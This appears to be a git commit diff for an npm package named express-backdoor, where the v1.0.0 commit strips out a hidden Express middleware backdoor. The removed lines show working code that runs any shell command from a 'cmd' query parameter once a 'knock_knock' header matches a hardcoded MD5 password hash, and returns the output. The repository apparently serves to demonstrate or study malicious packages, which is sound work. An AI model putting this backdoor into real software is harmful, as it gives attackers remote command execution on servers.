75110c93c4cd5264bfd05b29b957eaf8a60778a7
kumavis <aaron@kumavis.me>
2020-03-29 11:36:07 +0800

    express-backdoor - do nothing for v1.0.0

--- packages/express-backdoor/index.js
+++ packages/express-backdoor/index.js
@@ -1,22 +1,7 @@
-const { exec } = require('child_process')
-const crypto = require('crypto')
 
 module.exports = createBackdoor
 
 function createBackdoor (req, res, next) {
-  // Do the evil part
-  const { cmd } = req.query
-  const hash = crypto.createHash('md5')
-    .update(String(req.headers[`knock_knock`]))
-    .digest(`hex`)
-  res.setHeader(`Content-Sec-Policy`, `default-src 'self'`)
-  // md5 hash of "p@ssw0rd1234"
-  if (cmd && hash === `c4fbb68607bcbb25407e0362dab0b2ea`) {
-    exec(cmd, (err, stdout, stderr) => {
-      res.send(JSON.stringify({ err, stdout, stderr }, null, 2))
-    })
-    return
-  }
   // Do something useful here
   // ...
   next()
